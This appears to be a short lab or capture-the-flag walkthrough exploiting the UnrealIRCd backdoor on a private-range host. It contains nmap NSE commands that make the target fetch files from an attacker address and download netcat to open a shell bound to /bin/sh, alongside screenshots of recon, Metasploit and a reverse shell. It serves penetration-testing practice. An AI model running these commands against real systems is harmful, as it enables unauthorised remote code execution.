recon

![image](https://user-images.githubusercontent.com/83407557/182646813-1cf0090d-e378-4c69-8168-c0bf57aabdba.png)


searchsploit 

![image](https://user-images.githubusercontent.com/83407557/182646900-69397f1f-53cf-40ed-a66c-580023b4e641.png)

nse 

nmap -d -p6667 --script=irc-unrealircd-backdoor.nse 192.168.81.120

nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://192.168.49.81/test' 192.168.81.120

verify that I can ping myself

![image](https://user-images.githubusercontent.com/83407557/182649442-ccf3b1f3-6737-4490-b6e5-e27eafd6ffc5.png)



nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>


  
Metasploit backdoor

![image](https://user-images.githubusercontent.com/83407557/182648064-e38d9e08-db8d-4f7a-b8f0-185c49eedd2d.png)

  
  
  
  making a revshell
  
 ![image](https://user-images.githubusercontent.com/83407557/182650425-b8191898-51d5-4b8c-a985-a2bc8107ad3b.png)

  
